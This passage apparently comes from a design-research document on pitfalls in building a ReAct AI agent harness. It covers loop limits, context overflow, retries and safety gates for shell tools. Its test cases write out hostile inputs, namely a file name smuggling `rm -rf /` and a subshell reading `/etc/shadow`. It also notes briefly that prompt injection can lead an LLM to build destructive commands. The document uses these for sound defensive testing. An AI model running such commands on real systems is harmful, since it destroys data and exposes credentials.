| No undo/revert for cleanup operations | User regrets a cleanup action with no recourse | For destructive operations: use trash/recycle bin pattern (move to trash) not rm; or at minimum log what was deleted for manual recovery |
| Agent cannot explain its decisions | User asks "why did you delete that" and gets a generic response | Record decision provenance for every tool call: "deleted /tmp/old.logs because it was 2GB and last accessed 90 days ago" |

---

## "Looks Done But Isn't" Checklist

Things that appear complete but are missing critical pieces.

- [ ] **Agent loop**: Appears to work with simple queries, but has no max step limit and runs infinitely on open-ended questions. Verify by testing with a query that requires 20+ steps and confirming graceful termination.
- [ ] **Bash tool**: Returns correct results for simple commands, but does not handle arguments containing spaces, special characters, or shell metacharacters. Verify by testing `ls "/path/with spaces"` and `cat "file; rm -rf /"`.
- [ ] **Error handling**: Catches exceptions, but returns raw tracebacks to the LLM. Verify by checking what the LLM actually receives on tool failure.
- [ ] **Context management**: Truncates old messages, but breaks the tool_call/tool_result alternation pattern. Verify by checking message structure after truncation.
- [ ] **Tool descriptions**: Describes what each tool does, but omits "when NOT to use this tool" guidance. Verify by testing with ambiguous queries that could match multiple tools.
- [ ] **Tool results**: Returns data, but in raw unstructured format. Verify by checking if the LLM needs to ask follow-up questions to clarify tool output.
- [ ] **Termination**: Agent stops when it has an answer, but does not verify the answer is correct. Verify by testing with a query where the agent's conclusion is plausible but wrong.
- [ ] **Safety**: Dangerous operations require confirmation, but the confirmation dialog is trivial to bypass. Verify by ensuring confirmation cannot be injected by the agent itself.
- [ ] **Retry**: Retries on failure, but without idempotency keys -- causing duplicate side effects. Verify by testing with a tool that creates files and simulating a response timeout.
- [ ] **State persistence**: Agent state survives the current session, but is lost on restart. Verify by killing and restarting the agent mid-task and checking if it recovers.
- [ ] **Tool timeout**: Set globally (e.g., 30s), causing fast tools to wait unnecessarily and slow tools to timeout. Verify by testing with tools that should complete in <1s and tools that need >60s.

---

## Recovery Strategies

When pitfalls occur despite prevention, how to recover.

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Infinite loop | MEDIUM -- wasted tokens, possible context overflow | 1. Detect via loop detection (3+ same calls). 2. Inject metacognitive prompt with summary of what was tried. 3. If loop continues, terminate with "could not complete" summary. 4. Log full loop trace for debugging. |
| Context overflow | HIGH -- all progress may be lost | 1. LLM-based summary of all tool results to date. 2. Start fresh loop with summarized context. 3. Max 3 compaction cycles; after that, terminate with partial results. |
| Shell injection (exploited) | HIGH -- potential system compromise | 1. Immediately terminate agent. 2. Kill all spawned subprocesses. 3. Audit tool call history for unauthorized operations. 4. Restore files from backup if needed. 5. Patch the injection vector before restarting. |
| Message structure corruption | MEDIUM -- possible context loss | 1. Detect corrupt message structure. 2. Prune orphaned tool calls or dangling tool results. 3. Insert system message indicating cleanup was performed. 4. Continue from clean state. |
| Tool returns wrong data | MEDIUM -- agent may draw wrong conclusions | 1. No automatic recovery (harness cannot detect this). 2. User must identify wrong conclusions and restart agent. 3. Prevention: always show tool output in UI for user verification. |
| Agent crash (state lost) | MEDIUM -- work from last checkpoint lost | 1. Load last persisted checkpoint. 2. Re-inject the original goal. 3. Communicate to user: "restarted from checkpoint [timestamp]." |
| Rate limit exhaustion | LOW -- temporary slowdown | 1. Exponential backoff with jitter. 2. Queue pending tool calls. 3. Alert if rate limit persists >5 minutes (may indicate misconfigured tool). |
| Token budget exhausted with partial results | MEDIUM -- user gets incomplete answer | 1. Always save intermediate results as checkpoint. 2. Return structured "partial results" message. 3. Offer to continue with additional budget. |
| Dangerous tool called without confirmation | HIGH -- possible data loss | 1. Implement confirmation gate BEFORE tool execution (not after). 2. If tool executed, log everything. 3. No automatic undo -- inform user of what was done. |

---

## Pitfall-to-Phase Mapping

How roadmap phases should address these pitfalls.

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Infinite loop (P1) | Phase 1 (Core ReAct Loop): basic loop detection (3+ same calls) | Test: command the agent to "clean up all disk space" with only rm tool available -- verify loop detection triggers |
| Context overflow (P2) | Phase 3 (Context Engineering): compaction pipeline, preemptive detection | Test: run 15+ tool calls each returning 500 tokens -- verify context stays below 75% window |
| Message structure corruption (P3) | Phase 1 (Core ReAct Loop): tool_call_id matching, alternation validator | Test: insert orphaned tool call in history -- verify validator rejects or repairs before LLM call |
| Bash injection (P4) | Phase 1 (Core ReAct Loop): no `shell=True`, full command parsing, sandbox | Test: prompt "run `echo $(cat /etc/shadow)`" -- verify shell metacharacters are blocked |
| Undifferentiated errors (P5) | Phase 2 (Resilience): error classification, structured error output | Test: simulate timeout, permission error, and parameter error -- verify each gets different handling |
| Non-idempotent tools (P6) | Phase 2 (Resilience): call registry, idempotency keys | Test: simulate response timeout on file create -- verify tool is not called twice |
| Missing termination (P7) | Phase 1 (Core ReAct Loop): step budget, Verifier component | Test: open-ended query with no definitive answer -- verify agent terminates gracefully |
| Tool selection ambiguity (P8) | Phase 1 (Core ReAct Loop): tool routing, counter-indications in descriptions | Test: create 10 tools with overlapping functions -- verify selection accuracy with routing enabled |
| State loss across recovery (P9) | Phase 2 (Resilience): failure registry, "do not repeat" list | Test: cause same tool error 3 times via different approaches -- verify agent does not repeat |
| Undigestible tool outputs (P10) | Phase 1 (Core ReAct Loop): structured output contract per tool | Test: check every tool's output format includes `status`, `summary`, `data` fields |

---

## Danger Zone: ReAct Loop Architecture Mistakes

### Mistake: Trusting the LLM for Safety-Critical Decisions

**What:** Relying on the LLM's ability to self-censor dangerous operations, choose the right tool, or identify when it is stuck.

**Why it fails:** LLMs are trained to be helpful, not safe. They will follow instructions even when those instructions are dangerous. They have no intrinsic "safe/unsafe" classification -- they have "plausible/implausible" text generation. Prompt injection, adversarial inputs, and even simple ambiguity can cause an LLM to construct `rm -rf /` as a command.

**Fix:** The harness must enforce safety, not the model. The model suggests actions; the harness validates, gates, and confirms them. This applies to:
- Tool selection (harness validates tool exists, parameters are valid)
- Execution safety (harness sandboxes, confirms dangerous operations)
- Termination (harness enforces budget limits, detects loops)
- Error handling (harness classifies errors, selects recovery strategy)

### Mistake: Mixing Safety Levels in the Same Tool Set

**What:** Read-only diagnostic tools and destructive cleanup tools are presented to the agent at the same level, with equal accessibility.

**Why it fails:** The agent may call `rm -rf /var/log` in the same decision step where it calls `df -h`. The destructive tool is as easy to call as the diagnostic one. The LLM has no intrinsic understanding of the gravity difference.

**Fix:** Group tools by safety level and require escalating approval:
- Level 1 (read-only): `df`, `du`, `ls`, `find` -- no confirmation needed
- Level 2 (safe writes): `touch`, `mkdir` in workspace -- simple confirmation
- Level 3 (dangerous): `rm`, `dd`, `mkfs` -- explicit two-step confirmation, human-in-the-loop gate

### Mistake: No Observability in the Loop

**What:** The agent loop produces results but no observability data -- no step timing, no tool call latency, no error classification counts, no context utilization metrics.

**Why it fails:** Without observability, every agent failure is a black box. You cannot tell if the agent is looping because of context overflow, tool selection error, or prompt deficiency. Debugging requires guessing.

**Fix:** Instrument every loop iteration with:
- Per-step: tool called, parameters, latency, token count, finish_reason
- Per-session: total steps, total tokens, unique tools used, errors by category, loop detection triggers
- UI: real-time streaming of thinking, tool calls, results, and decisions

---

## Sources

- LangGraph RFC #6617: Production Reliability Improvements for ReAct Agents -- systematic catalog of agent failure modes (context overflow, stuck loops, silent termination, empty responses, tool error mishandling)
- LlamaIndex Engineering Insights (April 2026): Production outages from infinite loops (token probability collapse) and safety filter false positives
- Claude Code's Agent Harness Pattern (production post-mortem): Recovery Ladder (collapse drain, reactive compact, token escalation, stop hook retry)
- Agent-Fox issue #178: Shell metacharacter allowlist bypass via subshell, process substitution, pipe chains
- Safer project (crufter/safer): Capability-based command classification (read-only vs. data-write vs. data-delete vs. env-ephemeral vs. env-persistent)
- UiPath Engineering Blog: State Restoration in Long-Running Agent Workflows (snapshotting vs. deterministic replay vs. checkpointing)
- Zencoder AI Agent Survival Guide: Real-world incidents (OpenClaw, Zenity Labs, 1Password/Molook, Moltbook)
- LangGraph issue #177 (openai-agents-python): Context window overflow -- BadRequestError at 288K tokens exceeding 256K limit; no auto-summarization
- Azure-dev issue #6842: LLM session context loss across error retries -- repeated identical failures
- OpenClaw PR #29371: Preemptive context overflow detection during tool loops with compaction cascade
- Penny issue #810: Empty content after many tool calls -- context saturation leading to degenerate model outputs
- MightyBot Blog: Designing Fault-Tolerant AI Agent Pipelines (idempotency, retries, state management)
- Adaline Labs: Reliable Tool-Using AI Agents (tool risk classification, per-tool timeouts, approval gates)
- Inngest Blog (Building Durable Agents): Memory explosion, non-deterministic answers, infinite loops, forgetting goals, no recovery on crash

---
*Pitfalls research for: ReAct AI Agent Framework with Harness Engineering (loopAI)*
*Researched: 2026-05-27*
